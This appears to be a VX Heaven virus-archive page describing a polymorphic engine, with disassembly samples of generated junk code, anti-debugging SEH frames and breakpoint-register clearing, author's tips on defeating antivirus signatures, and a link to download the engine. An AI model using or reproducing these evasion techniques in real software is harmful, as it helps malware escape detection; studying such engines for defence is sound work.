@@ -1,0 +1,187 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> Badf00d Polymorphic Engine - Computer virus engines (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content=""/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири"/>
+<meta name="Description" content="Author's comments  Features      SEH frames generator (int3/sti/cli exceptions, BPM removers (dr0-3 cleaners), random registry usage, random size of garbage block (return address is calculated via size of the generated junks), generated SEH block looks like this:         * SNIP *       00402814   E8 3D000000      CALL pol.00402856       00402819   8BD4             MOV EDX,ESP                 ; generated REG       0040281B   81C2 0C000000    ADD EDX,0C                         00402821   8B12             MOV EDX,DWORD PTR DS:[EDX]         00402823   C782 04000000 00&gt;MOV DWORD PTR DS:[EDX+4],0         0040282D   C782 08000000 00&gt;MOV DWORD PTR DS:[EDX+8],0         00402837   C782 12000000 00&gt;MOV DWORD PTR DS:[EDX+12],0        00402841   C782 16000000 00&gt;MOV DWORD PTR DS:[EDX+16],0        0040284B   8182 B8000000 05&gt;ADD DWORD PTR DS:[EDX+B8],5 ; calcs return addr       00402855   C3               RETN       00402856   33C9             XOR ECX,ECX       00402858   64:FF31          PUSH DWORD PTR FS:[ECX]       0040285B   64:8921          MOV DWORD PTR FS:[ECX],ESP       0040285E   CC               INT3       0040285F   AF               SCAS DWORD PTR ES:[EDI]       00402860   C8 50C933        ENTER 0C950,33       00402864   C0648F 00 5A     SHL BYTE PTR DS:[EDI+ECX*4],5A       * SNIP *     As you can see doing only regswaping is not a good solution (still signature can be generated - look RegSwap virus description), prolly it is better to mix randomly SEH instructions with garbage. Use your imagination.    safe garbage generator (generates stepable garbage code, moreover user can specyfi what registers should be used and what should be not, this feature gives an advantage to mix original code together with garbage code, without destroying the values from orginal one), like this snipet shows:         * SNIP - ALL REGS ALLOWED *       00402814   F7D2             NOT EDX       00402816   D1D3             RCL EBX,1       00402818   9B               WAIT       00402819   9B               WAIT       0040281A   D1F9             SAR ECX,1       0040281C   93               XCHG EAX,EBX       0040281D   81C3 B9B1F0A8    ADD EBX,A8F0B1B9       00402823   F9               STC       00402824   81EF 73D13C4E    SUB EDI,4E3CD173       0040282A   3BC7             CMP EAX,EDI       0040282C   FD               STD       0040282D   2BC6             SUB EAX,ESI       0040282F   57               PUSH EDI       00402830   81C9 6FA7215F    OR ECX,5F21A76F       00402836   33F3             XOR ESI,EBX       00402838   F7D8             NEG EAX       0040283A   1BCE             SBB ECX,ESI       * SNIP - ALL REGS ALLOWED *         * SNIP - ALLOWED EAX/EBX *       00402814   F7DB             NEG EBX       00402816   F7D0             NOT EAX       00402818   85C3             TEST EBX,EAX       0040281A   F8               CLC       0040281B   90               NOP       0040281C   C7C3 BB153882    MOV EBX,823815BB       00402822   F7D8             NEG EAX       00402824   09DB             OR EBX,EBX       00402826   D1D3             RCL EBX,1       00402828   D1D8             RCR EAX,1       0040282A   EB 00            JMP SHORT pol.0040282C       0040282C   81EB 011DAF21    SUB EBX,21AF1D01       00402832   81E8 3BB25C3B    SUB EAX,3B5CB23B       00402838   F8               CLC       * SNIP - ALLOWED EAX/EBX *      hardcore garbage generator (generates jmp over_garbage and generates garbage stepable or totaly randomized - this one will be never executed), like here:         * SNIP - SOME GARBAGE CODE *       00402810   EB 14            JMP SHORT pol.00402826       00402812   CB               RETF                                            00402813   69A0 1C1E85D1 F9&gt;IMUL ESP,DWORD PTR DS:[EAX+D1851E1C],886&gt;       0040281D   F2:              PREFIX REPNE:                                   0040281E   4B               DEC EBX       0040281F   85FF             TEST EDI,EDI       00402821   198A 797CF6EB    SBB DWORD PTR DS:[EDX+EBF67C79],ECX       00402827   0C C8            OR AL,0C8       * SNIP - SOME GARBAGE CODE *      backwards jumps generator (generates some funny jumps :))         * SNIP *        0040280C   EB 3A            JMP SHORT pol.00402848       0040280E   33FE             XOR EDI,ESI       00402810   EB 3B            JMP SHORT pol.0040284D       00402812   AE               SCAS BYTE PTR ES:[EDI]       00402813  ^73 C8            JNB SHORT pol.004027DD       00402815   71 13            JNO SHORT pol.0040282A       00402817   90               NOP       00402818   5E               POP ESI       00402819   C2 AFE0          RETN 0E0AF       0040281C   BB 8406103D      MOV EBX,3D100684       00402821   60               PUSHAD       00402822   E5 77            IN EAX,77                                      00402824   2AC4             SUB AL,AH       00402826   59               POP ECX       00402827   3E:5C            POP ESP                                         00402829   0E               PUSH CS       0040282A   67:73 7A         JNB SHORT pol.004028A7                         0040282D   AF               SCAS DWORD PTR ES:[EDI]       0040282E   27               DAA       0040282F   0880 3B2E3EF3    OR BYTE PTR DS:[EAX+F33E2E3B],AL       00402835   5D               POP EBP       00402836   52               PUSH EDX       00402837   D9FB             FSINCOS       00402839  ^E1 BD            LOOPDE SHORT pol.004027F8       0040283B   4E               DEC ESI       0040283C   53               PUSH EBX       0040283D   4D               DEC EBP       0040283E   62D6             BOUND EDX,ESI                                   00402840   A7               CMPS DWORD PTR DS:[ESI],DWORD PTR ES:[ED&gt;       00402841   FF49 8C          DEC DWORD PTR DS:[ECX-74]       00402844   07               POP ES                                          00402845   56               PUSH ESI       00402846   7A 15            JPE SHORT pol.0040285D       00402848   9B               WAIT       00402849  ^EB C5            JMP SHORT pol.00402810       0040284B   6E               OUTS DX,BYTE PTR ES:[EDI]                      0040284C   45               INC EBP       * SNIP *"/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"cf8d1075d21322cd400e38f4193a82fd935e4434-1498757918-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/vx.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"> [<a href="/vx.php?id=ea00">Previous</a>] [<a href="/vx.php?id=eidx">Index</a>] [<a href="/vx.php?id=el12">Next</a>] <h1> Badf00d Polymorphic Engine</h1><p><strong>Author: Bania, Piotr</strong></p><p><strong>Author's comments</strong></p>
+<h2>Features</h2>
+<ul>
+<li>SEH frames generator (int3/sti/cli exceptions, BPM removers (dr0-3 cleaners), random registry usage, random size of garbage block (return address is calculated via size of the generated junks), generated SEH block looks like this:
+<pre class="source">
+     * SNIP *
+     00402814   E8 3D000000      CALL pol.00402856
+     00402819   8BD4             MOV EDX,ESP                 ; generated REG
+     0040281B   81C2 0C000000    ADD EDX,0C                  
+     00402821   8B12             MOV EDX,DWORD PTR DS:[EDX]  
+     00402823   C782 04000000 00>MOV DWORD PTR DS:[EDX+4],0  
+     0040282D   C782 08000000 00>MOV DWORD PTR DS:[EDX+8],0  
+     00402837   C782 12000000 00>MOV DWORD PTR DS:[EDX+12],0 
+     00402841   C782 16000000 00>MOV DWORD PTR DS:[EDX+16],0 
+     0040284B   8182 B8000000 05>ADD DWORD PTR DS:[EDX+B8],5 ; calcs return addr
+     00402855   C3               RETN
+     00402856   33C9             XOR ECX,ECX
+     00402858   64:FF31          PUSH DWORD PTR FS:[ECX]
+     0040285B   64:8921          MOV DWORD PTR FS:[ECX],ESP
+     0040285E   CC               INT3
+     0040285F   AF               SCAS DWORD PTR ES:[EDI]
+     00402860   C8 50C933        ENTER 0C950,33
+     00402864   C0648F 00 5A     SHL BYTE PTR DS:[EDI+ECX*4],5A
+     * SNIP * 
+</pre>
+<p>As you can see doing only regswaping is not a good solution (still signature can be generated - look RegSwap virus description), prolly it is better to mix randomly SEH instructions with garbage. Use your imagination.</p></li>
+<li>safe garbage generator (generates stepable garbage code, moreover user can specyfi what registers should be used and what should be not, this feature gives an advantage to mix original code together with garbage code, without destroying the values from orginal one), like this snipet shows:
+<pre class="source">
+     * SNIP - ALL REGS ALLOWED *
+     00402814   F7D2             NOT EDX
+     00402816   D1D3             RCL EBX,1
+     00402818   9B               WAIT
+     00402819   9B               WAIT
+     0040281A   D1F9             SAR ECX,1
+     0040281C   93               XCHG EAX,EBX
+     0040281D   81C3 B9B1F0A8    ADD EBX,A8F0B1B9
+     00402823   F9               STC
+     00402824   81EF 73D13C4E    SUB EDI,4E3CD173
+     0040282A   3BC7             CMP EAX,EDI
+     0040282C   FD               STD
+     0040282D   2BC6             SUB EAX,ESI
+     0040282F   57               PUSH EDI
+     00402830   81C9 6FA7215F    OR ECX,5F21A76F
+     00402836   33F3             XOR ESI,EBX
+     00402838   F7D8             NEG EAX
+     0040283A   1BCE             SBB ECX,ESI
+     * SNIP - ALL REGS ALLOWED *
+
+     * SNIP - ALLOWED EAX/EBX *
+     00402814   F7DB             NEG EBX
+     00402816   F7D0             NOT EAX
+     00402818   85C3             TEST EBX,EAX
+     0040281A   F8               CLC
+     0040281B   90               NOP
+     0040281C   C7C3 BB153882    MOV EBX,823815BB
+     00402822   F7D8             NEG EAX
+     00402824   09DB             OR EBX,EBX
+     00402826   D1D3             RCL EBX,1
+     00402828   D1D8             RCR EAX,1
+     0040282A   EB 00            JMP SHORT pol.0040282C
+     0040282C   81EB 011DAF21    SUB EBX,21AF1D01
+     00402832   81E8 3BB25C3B    SUB EAX,3B5CB23B
+     00402838   F8               CLC
+     * SNIP - ALLOWED EAX/EBX *
+</pre></li>
+<li>hardcore garbage generator (generates jmp over_garbage and generates garbage stepable or totaly randomized - this one will be never executed), like here:
+<pre class="source">
+     * SNIP - SOME GARBAGE CODE *
+     00402810   EB 14            JMP SHORT pol.00402826
+     00402812   CB               RETF                                     
+     00402813   69A0 1C1E85D1 F9>IMUL ESP,DWORD PTR DS:[EAX+D1851E1C],886>
+     0040281D   F2:              PREFIX REPNE:                            
+     0040281E   4B               DEC EBX
+     0040281F   85FF             TEST EDI,EDI
+     00402821   198A 797CF6EB    SBB DWORD PTR DS:[EDX+EBF67C79],ECX
+     00402827   0C C8            OR AL,0C8
+     * SNIP - SOME GARBAGE CODE *
+</pre>
+<li>backwards jumps generator (generates some funny jumps :))
+<pre class="source">
+     * SNIP * 
+     0040280C   EB 3A            JMP SHORT pol.00402848
+     0040280E   33FE             XOR EDI,ESI
+     00402810   EB 3B            JMP SHORT pol.0040284D
+     00402812   AE               SCAS BYTE PTR ES:[EDI]
+     00402813  ^73 C8            JNB SHORT pol.004027DD
+     00402815   71 13            JNO SHORT pol.0040282A
+     00402817   90               NOP
+     00402818   5E               POP ESI
+     00402819   C2 AFE0          RETN 0E0AF
+     0040281C   BB 8406103D      MOV EBX,3D100684
+     00402821   60               PUSHAD
+     00402822   E5 77            IN EAX,77                               
+     00402824   2AC4             SUB AL,AH
+     00402826   59               POP ECX
+     00402827   3E:5C            POP ESP                                  
+     00402829   0E               PUSH CS
+     0040282A   67:73 7A         JNB SHORT pol.004028A7                  
+     0040282D   AF               SCAS DWORD PTR ES:[EDI]
+     0040282E   27               DAA
+     0040282F   0880 3B2E3EF3    OR BYTE PTR DS:[EAX+F33E2E3B],AL
+     00402835   5D               POP EBP
+     00402836   52               PUSH EDX
+     00402837   D9FB             FSINCOS
+     00402839  ^E1 BD            LOOPDE SHORT pol.004027F8
+     0040283B   4E               DEC ESI
+     0040283C   53               PUSH EBX
+     0040283D   4D               DEC EBP
+     0040283E   62D6             BOUND EDX,ESI                            
+     00402840   A7               CMPS DWORD PTR DS:[ESI],DWORD PTR ES:[ED>
+     00402841   FF49 8C          DEC DWORD PTR DS:[ECX-74]
+     00402844   07               POP ES                                   
+     00402845   56               PUSH ESI
+     00402846   7A 15            JPE SHORT pol.0040285D
+     00402848   9B               WAIT
+     00402849  ^EB C5            JMP SHORT pol.00402810
+     0040284B   6E               OUTS DX,BYTE PTR ES:[EDI]               
+     0040284C   45               INC EBP
+     * SNIP * 
+</pre>
+<br clear="all"/><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/vx.php?id=eb07';</script><a href="/vx.php?id=eb07#disqus_thread">Comments</a><br/><div style="float:left;"><div style="float: left;"><strong>Download</strong></div><br clear="all"/><table cellspacing="0" cellpadding="0" border="1"><tr bgcolor="#aaa999"><th>&nbsp;</th><th>Filename</th><th>Size</th><th>Description</th><th>Date</th><th>&nbsp;</th></tr><tr bgcolor="#cccbbb"><td><form class="fr" method="post" action="/file.php"><input type="image" src="/img/dl.gif" alt="Download"/><input type="hidden" name="file" value="cGxlL2JhZGYwMGQuemlw"/></form></td><td><a name="f1466"></a><small><a href="/dl/ple/badf00d.zip">badf00d.zip</a></small></td><td><small>7071</small></td><td><small>BFPE</small></td><td><small>Aug 2005</small></td><td><small style="float: right; font-family: fixed;">MD5 sum b21a37d8674190fc407681459cbc7496</small></td></tr></table></div><br clear="all"/>
+</div><div class="si"><img src="/img/mag/badfood.gif" alt=""/></div><br/><div class="s2">
+<div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/vx.php?lang=de&amp;id=eb07">de</a><a href="/vx.php?lang=en&amp;id=eb07">en</a><a href="/vx.php?lang=es&amp;id=eb07">es</a><a href="/vx.php?lang=it&amp;id=eb07">it</a><a href="/vx.php?lang=fr&amp;id=eb07">fr</a><a href="/vx.php?lang=pl&amp;id=eb07">pl</a><a href="/vx.php?lang=ru&amp;id=eb07">ru</a><a href="/vx.php?lang=ua&amp;id=eb07">ua</a></div>
+</body>
+</html>
